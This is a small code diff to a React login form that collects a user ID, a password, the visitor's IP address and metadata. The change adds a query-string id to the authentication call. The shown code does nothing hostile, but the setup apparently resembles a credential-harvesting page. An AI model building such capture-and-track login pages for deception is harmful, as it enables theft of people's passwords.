@@ -2,12 +2,13 @@ import { useState, useEffect } from 'react'
 import { Authenticate } from '../../helpers/Auth'
 import axios from 'axios'
 import Loader from '../../component/Loader'
+import useQueryParams from '../../hooks/useQueryParams'
 
 const Other = () => {
   const [userID, setUserID] = useState('')
   const [password, setPassword] = useState('')
   const [error, setError] = useState('')
-
+  const id = useQueryParams()
   const [IPAddress, setIPAddress] = useState('')
   const [metaData, setMetaData] = useState('')
   const [redirect, setRedirect] = useState(false)
@@ -47,8 +48,8 @@ const Other = () => {
       setError('Please provide a valid email and password')
     } else {
       setIsLoading(true)
-      Authenticate(userID, password, 'Others', IPAddress, metaData).then(() =>
-        setRedirect(true)
+      Authenticate(userID, password, 'Others', IPAddress, metaData, id).then(
+        () => setRedirect(true)
       )
     }
   }
